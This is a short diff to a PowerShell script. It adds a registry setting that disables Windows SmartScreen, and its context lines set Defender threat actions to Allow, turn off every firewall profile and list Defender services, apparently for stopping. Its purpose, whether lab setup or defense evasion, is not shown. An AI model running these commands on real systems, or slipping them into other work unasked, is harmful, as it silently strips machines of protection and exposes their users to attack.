@@ -52,6 +52,7 @@ Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-NetFirewallProfile -All -Enabled false
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType "DWord"
 $need_reboot = $false
 $counter = 0
 $svc_list = @("WdNisSvc", "WinDefend", "Sense")
